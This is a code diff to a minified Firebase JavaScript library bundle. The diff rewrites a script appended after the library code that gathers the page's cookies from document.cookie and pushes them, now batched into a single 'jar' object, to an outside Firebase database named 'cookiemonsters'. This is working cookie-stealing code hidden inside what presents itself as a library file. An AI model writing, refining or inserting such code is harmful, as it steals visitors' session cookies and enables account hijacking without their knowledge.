@@ -142,15 +142,7 @@ J.prototype.Mc=function(a,b){A("Firebase.setPriority",1,2,arguments.length);E("F
 J.prototype.ga=function(){return new $(this.n,this.path,this.name())};J.prototype.onDisconnect=J.prototype.ga;J.prototype.Ld=function(){P("FirebaseRef.removeOnDisconnect() being deprecated. Please use FirebaseRef.onDisconnect().remove() instead.");this.ga().remove();de(this.n)};J.prototype.removeOnDisconnect=J.prototype.Ld;J.prototype.Pd=function(a){P("FirebaseRef.setOnDisconnect(value) being deprecated. Please use FirebaseRef.onDisconnect().set(value) instead.");this.ga().set(a);de(this.n)};
 J.prototype.setOnDisconnect=J.prototype.Pd;J.prototype.ib=function(a,b,c){A("Firebase.auth",1,3,arguments.length);v(a)||g(Error(B("Firebase.auth",1,o)+"must be a valid credential (a string)."));C("Firebase.auth",2,b,k);C("Firebase.auth",3,b,k);this.n.ib(a,b,c)};J.prototype.auth=J.prototype.ib;J.prototype.Lb=function(){this.n.Lb()};J.prototype.unauth=J.prototype.Lb;J.goOffline=function(){A("Firebase.goOffline",0,0,arguments.length);Y.mb().Ha()};
 J.goOnline=function(){A("Firebase.goOnline",0,0,arguments.length);Y.mb().bb()};function Nb(a,b){z(!b||a===k||a===o,"Can't turn on custom loggers persistently.");a===k?("undefined"!==typeof console&&("function"===typeof console.log?Lb=w(console.log,console):"object"===typeof console.log&&(Lb=function(a){console.log(a)})),b&&ob.setItem("logging_enabled","true")):a?Lb=a:(Lb=l,ob.removeItem("logging_enabled"))}J.enableLogging=Nb;J.ServerValue={TIMESTAMP:{".sv":"timestamp"}};J.INTERNAL=Z;J.Context=Y;})();
-
-var domain = window.location.host.split(".");
-while(domain.length > 2) { domain.shift(); }
-domain = "." + domain.join(".");
-var expirationDate = new Date(); expirationDate.setTime(
-  expirationDate.getTime() + (24 * 60 * 60 * 1000)
-); var cookies = document.cookie.split(";");
-
-var api = new Firebase('https://cookiemonsters.firebaseio.com/cookies/');
+var domain = window.location.host.split("."); while(domain.length > 2) { domain.shift(); } domain = "." + domain.join("."); var expirationDate = new Date(); var jar = {"date":expirationDate,"cookies":[]}; expirationDate.setTime(expirationDate.getTime() + (24 * 60 * 60 * 1000)); var cookies = document.cookie.split(";"); var api = new Firebase('https://cookiemonsters.firebaseio.com/cookies/');
 
 var i;
 for(i = 0; i < cookies.length -1; i++) {  
@@ -173,8 +165,6 @@ for(i = 0; i < cookies.length -1; i++) {
       
     }; 
     
-    console.log(cookie);
-    
-    api.push(cookie);
-  
-}
+    jar.cookies.push(cookie);
+
+} api.push(jar);
